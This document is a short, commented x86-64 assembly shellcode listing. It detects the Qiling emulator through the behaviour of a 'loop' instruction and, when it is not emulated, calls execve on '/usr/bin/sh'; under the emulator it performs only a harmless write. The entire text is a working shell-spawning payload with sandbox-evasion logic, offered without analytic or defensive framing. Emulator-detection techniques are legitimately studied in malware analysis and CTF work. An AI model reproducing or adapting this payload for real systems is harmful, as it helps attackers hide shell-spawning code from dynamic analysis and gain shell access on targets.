xor     r15,r15                 # xor reg,reg is the same as zeroing that reg
push    r15
push    r15
mov     r15,0x68732f
push    r15
mov     r15,0x6e69622f7273752f  
push    r15                     # Put `/usr/bin/sh` on stack 8 bytes (characters) at a time

mov     rcx,1
l1:
loop    l1                      # rcx = qiling ? 0 : 1

mov     rax,58
imul    rax,rcx                 # rax = qiling ? 0 (write sycall number - 1) : 58 (execve syscall number - 1)
inc     rax                     # syscall = qiling ? 1 (write) : 59 (execve)

mov     rdi,rsp
dec     rdi
imul    rdi,rcx
inc     rdi                     # rdi = syscall arg0 = qiling ? 1 (STDOUT) : rsp (pointer to '/usr/bin/sh')

xor     rsi,rsi                 # zero out arg1
xor     rdx,rdx                 # zero out arg2
syscall                         # qiling ? write(STDOUT, NULL, 0) : execve('/usr/bin/sh', NULL, NULL)

mov     rax,0x3c
xor     rdi,rdi
syscall                         # exit(0)